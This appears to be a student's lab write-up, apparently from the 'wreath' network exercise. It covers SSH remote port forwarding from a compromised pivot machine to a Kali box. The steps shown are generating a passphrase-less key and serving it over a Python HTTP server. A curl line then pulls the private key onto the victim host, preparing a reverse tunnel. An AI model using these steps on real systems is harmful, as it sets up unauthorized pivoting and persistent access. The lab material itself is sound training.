

now to do rmeote port frwarding 

we need to do port formarwd from the victim mahcine to our kali to make a revse conenction 

start ssh on kali 

```
┌──(root㉿kali)-[/home/kali/Downloads/wreath]
└─# service ssh start 
```

now make a ssh key file to trnasfer there 

```
┌──(kali㉿kali)-[~/Downloads/wreath]
└─$ ssh-keygen        
Generating public/private ed25519 key pair.
Enter file in which to save the key (/home/kali/.ssh/id_ed25519): /home/kali/.ssh/id_tempkey
Enter passphrase for "/home/kali/.ssh/id_tempkey" (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/kali/.ssh/id_tempkey
Your public key has been saved in /home/kali/.ssh/id_tempkey.pub
The key fingerprint is:
SHA256:UAKMJMYE82gkbh0ZRDTQzq5flGkwIlZw8wrL9y6tH2o kali@kali
```

we create a new ssh temperiaty key 

and rmeoemeber to give it full path 

```
/home/kali/.ssh/id_tempkey
```

we check we have  made the key 

```
┌──(kali㉿kali)-[~/Downloads/wreath]
└─$ ls -al /home/kali/.ssh
-rw-------  1 kali kali  399 Sep 15 13:33 id_tempkey
-rw-r--r--  1 kali kali   91 Sep 15 13:33 id_tempkey.pub
```


now we have to trnasfer our private key to the pivot machine 

now we start a python sevrer in th essh fodler 

```
┌──(kali㉿kali)-[~/Downloads/wreath]
└─$ cd /home/kali/.ssh
                                                                                                        
┌──(kali㉿kali)-[~/.ssh]
└─$ ls                    
id_tempkey  id_tempkey.pub 
                                                                                                        
┌──(kali㉿kali)-[~/.ssh]
└─$ python3 -m http.server 80


```

and receive the file htere 

```
curl http://10.250.180.5/id_tempkey -o id_tempkey
```

give oermission to the file 

```
chmod 600 id_tempkey
```




